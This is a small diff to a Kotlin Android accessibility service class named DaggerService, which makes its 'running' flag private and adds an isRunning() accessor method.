@@ -24,7 +24,11 @@ class DaggerService : AccessibilityService() {
 
     companion object {
         private val TAG: String = DaggerService::class.java.name
-        var running: Boolean = false
+        private var running: Boolean = false
+
+        fun isRunning(): Boolean {
+            return running
+        }
     }
 
     lateinit var pinRecorder: PinRecorder
